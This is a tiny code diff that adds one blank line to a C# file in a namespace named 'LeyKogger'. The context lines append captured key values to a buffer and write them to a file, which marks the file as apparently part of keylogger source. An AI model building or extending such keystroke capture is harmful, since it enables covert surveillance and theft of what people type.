@@ -46,6 +46,7 @@ namespace LeyKogger
 
                     buffer += key.ToString();
                 }
+
                 File.AppendAllText(path, buffer);
                 buffer = "";
                 keys.Clear();
